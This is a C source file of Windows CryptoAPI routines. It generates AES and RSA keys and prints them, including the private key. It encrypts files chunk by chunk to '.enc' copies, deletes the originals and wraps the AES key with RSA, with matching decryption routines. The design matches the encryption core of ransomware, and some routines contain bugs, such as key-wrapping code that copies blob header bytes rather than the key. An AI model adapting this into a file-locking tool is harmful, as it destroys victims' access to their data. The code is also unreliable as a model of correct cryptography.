#include "crypto.h"

#include <stdio.h>
#include <string.h>

void InitializeCrypto(HCRYPTPROV *hProv, HCRYPTKEY *hAesKey, HCRYPTKEY *hRsaKey, BYTE **aesKeyBlob) {
    DWORD aesBlobLen = 0, rsaBlobLen = 0;
    BYTE *rsaKeyBlob;
    if (!CryptAcquireContext(hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        printf("Error at CryptAcquireContext %d\n", GetLastError());
        return;
    }
    if (!CryptGenKey(*hProv, CALG_AES_128, CRYPT_EXPORTABLE, hAesKey)) {
        printf("Error at CryptGenKey for AES: %d\n", GetLastError());
        CryptReleaseContext(*hProv, 0);
        return;
    }
    if (!CryptGenKey(*hProv, AT_KEYEXCHANGE, (2048 << 16) | CRYPT_EXPORTABLE, hRsaKey)) {
        printf("Error at CryptGenKey for RSA: %d\n", GetLastError());
        CryptReleaseContext(*hProv, 0);
        return;
    }
    if (CryptExportKey(*hAesKey, 0, PLAINTEXTKEYBLOB, 0, NULL, &aesBlobLen)) {
        *aesKeyBlob = (BYTE*)malloc(aesBlobLen);
    } else {
        printf("Error getting blob length: %d\n", GetLastError());
    }
    if (*aesKeyBlob && CryptExportKey(*hAesKey, 0, PLAINTEXTKEYBLOB, 0, *aesKeyBlob, &aesBlobLen)) {
        printf("Export successful! Blob size: %ld bytes\nAES 128 key: ", aesBlobLen);
        for (DWORD i = 12; i < aesBlobLen; i++) {
            printf("%02x", (*aesKeyBlob)[i]);
        }
        printf("\n");
    }
    if (CryptExportKey(*hRsaKey, 0, PRIVATEKEYBLOB, 0, NULL, &rsaBlobLen)) {
        rsaKeyBlob = (BYTE*)malloc(rsaBlobLen);
        CryptExportKey(*hRsaKey, 0, PRIVATEKEYBLOB, 0, rsaKeyBlob, &rsaBlobLen);
        printf("RSA private key blob: ");
        for (size_t i = 0; i < rsaBlobLen; i++) {
            printf("%02x", rsaKeyBlob[i]);
        }
        printf("\n");
    }
    if (CryptExportKey(*hRsaKey, 0, PUBLICKEYBLOB, 0, NULL, &rsaBlobLen)) {
        rsaKeyBlob = (BYTE*)malloc(rsaBlobLen);
        CryptExportKey(*hRsaKey, 0, PUBLICKEYBLOB, 0, rsaKeyBlob, &rsaBlobLen);
        printf("RSA public key blob: ");
        for (size_t i = 0; i < rsaBlobLen; i++) {
            printf("%02x", rsaKeyBlob[i]);
        }
        printf("\n");
    }
}

void KeyEncrypt(BYTE **key, HCRYPTKEY hKey) {
    BYTE *encryptedKey = (BYTE*)malloc(256);
    DWORD encryptedKeyLen = 256;
    DWORD keyLen = 16;
    memcpy(encryptedKey, *key, 16);
    if (CryptEncrypt(hKey, 0, TRUE, 0, encryptedKey, &encryptedKeyLen, keyLen)) {
        free(*key);
        *key = encryptedKey;
    } else {
        free(encryptedKey);
    }
}

void FileEncrypt(char *path, HCRYPTPROV hProv, HCRYPTKEY hKey) {
    FILE *fptr = fopen(path, "rb+");
    if (!fptr) return;
    unsigned char *newPath = (unsigned char*)malloc(260);
    sprintf(newPath, "%s.enc", path);
    FILE *fptr2 = fopen(newPath, "wb");
    if (!fptr2) {
        free(newPath);
        fclose(fptr);
        return;
    }
    DWORD chunkSize = 1024*16;
    DWORD bufferSize = chunkSize + 16;
    BYTE *buffer = (BYTE*)malloc(bufferSize);
    DWORD bytesRead = 0;
    BYTE iv[16];
    if (!CryptGenRandom(hProv, 16, iv)) {
        fclose(fptr);
        free(buffer);
        return;
    } else {
        fwrite(iv, 1, 16, fptr2);
    }
    BOOL final = FALSE;
    DWORD dwMode = CRYPT_MODE_CBC;
    CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&dwMode, 0);
    CryptSetKeyParam(hKey, KP_IV, iv, 0);
    while ((bytesRead = fread(buffer, 1, chunkSize, fptr)) > 0) {
        if (feof(fptr)) final = TRUE;
        DWORD workingLen = bytesRead;
        if (CryptEncrypt(hKey, 0, final, 0, buffer, &workingLen, bufferSize)) {
            fwrite(buffer, 1, workingLen, fptr2);
        }
    }
    free(buffer);
    free(newPath);
    fclose(fptr);
    fclose(fptr2);
    remove(path);
}

void HexToBytes(const char *hex, BYTE* bytes) {
    for (size_t i = 0; i < strlen(hex); i+=2) {
        sscanf(hex + i, "%02hhx", &bytes[i / 2]);
    }
}

HCRYPTKEY ImportRSAPrivateKey(char *hexStr, HCRYPTPROV hProv) {
    DWORD blobLen = strlen(hexStr) / 2;
    BYTE *blobData = (BYTE*)malloc(blobLen);
    HexToBytes(hexStr, blobData);
    HCRYPTKEY hKey = 0;
    CryptImportKey(hProv, blobData, blobLen, 0, 0, &hKey);
    SecureZeroMemory(blobData, blobLen);
    free(blobData);
    return hKey;
}

HCRYPTKEY ImportRSAPublicKey(char *hexStr, HCRYPTPROV hProv) {
    DWORD blobLen = strlen(hexStr) / 2;
    BYTE *blobData = (BYTE*)malloc(blobLen);
    HexToBytes(hexStr, blobData);
    HCRYPTKEY hKey = 0;
    CryptImportKey(hProv, blobData, blobLen, 0, CRYPT_EXPORTABLE, &hKey);
    SecureZeroMemory(blobData, blobLen);
    free(blobData);
    return hKey;
}

HCRYPTKEY ImportAESKey(char *hexStr, HCRYPTPROV hProv) {
    BYTE hexRaw[16];
    HexToBytes(hexStr, hexRaw);

    #pragma pack(push, 1)
    struct {
        BLOBHEADER header;
        DWORD cbSize;
        BYTE keyData[16];
    } keyBlob;
    #pragma pack(pop)

    keyBlob.header.bType = PLAINTEXTKEYBLOB;
    keyBlob.header.bVersion = CUR_BLOB_VERSION;
    keyBlob.header.reserved = 0;
    keyBlob.header.aiKeyAlg = CALG_AES_128;
    keyBlob.cbSize = 16;
    memcpy(keyBlob.keyData, hexRaw, 16);

    HCRYPTKEY hKey = 0;
    if (!CryptImportKey(hProv, (BYTE*)&keyBlob, sizeof(keyBlob), 0, 0, &hKey)) {
        printf("Error importing key: %d\n", GetLastError());
        return 0;
    }
    return hKey;
}

void FileDecrypt(char *path, HCRYPTPROV hProv, HCRYPTKEY hKey) {
    FILE *fptr = fopen(path, "rb+");
    if (!fptr) return;
    unsigned char *newPath = (unsigned char*)malloc(260);
    size_t len = strlen(path);
    strncpy(newPath, path, len - 4);
    newPath[len - 4] = '\0';
    FILE *fptr2 = fopen(newPath, "wb");
    if (!fptr2) {
        free(newPath);
        fclose(fptr);
        return;
    }
    DWORD chunkSize = 1024*16;
    DWORD bufferSize = chunkSize + 16;
    BYTE *buffer = (BYTE*)malloc(bufferSize);
    DWORD bytesRead;
    BOOL final = FALSE;
    BYTE iv[16];
    fread(iv, 1, 16, fptr);
    DWORD dwMode = CRYPT_MODE_CBC;
    CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&dwMode, 0);
    CryptSetKeyParam(hKey, KP_IV, iv, 0);
    while (1) {
        bytesRead = (DWORD)fread(buffer, 1, chunkSize, fptr);
        if (bytesRead < chunkSize) {
            final = TRUE;
        }
        DWORD workingLen = bytesRead;
        if (CryptDecrypt(hKey, 0, final, 0, buffer, &workingLen)) {
            fwrite(buffer, 1, workingLen, fptr2);
        }
        if (final) break;
    }
    free(buffer);
    free(newPath);
    fclose(fptr);
    fclose(fptr2);
    remove(path);
}

void KeyDecrypt(BYTE **key, HCRYPTKEY hKey) {
    DWORD dwDataLen = 256; 
    BYTE *decryptedKey = (BYTE*)malloc(dwDataLen);
    if (decryptedKey == NULL) return;

    memcpy(decryptedKey, *key, 256);

    if (CryptDecrypt(hKey, 0, TRUE, 0, decryptedKey, &dwDataLen)) {
        free(*key);
        *key = (BYTE*)realloc(decryptedKey, dwDataLen);
    } else {
        free(decryptedKey);
    }
}

void FinalizeCrypto(HCRYPTPROV *hProv, HCRYPTKEY *hAesKey, HCRYPTKEY *hRsaKey, BYTE **keyBlob) {
    if (keyBlob && *keyBlob) {
        free(*keyBlob);
        *keyBlob = NULL;
    }
    if (hAesKey && *hAesKey) {
        CryptDestroyKey(*hAesKey);
        *hAesKey = 0;
    }
    if (hRsaKey && *hRsaKey) {
        CryptDestroyKey(*hRsaKey);
        *hRsaKey = 0;
    }
    if (hProv && *hProv) {
        CryptReleaseContext(*hProv, 0);
        *hProv = 0;
    }
}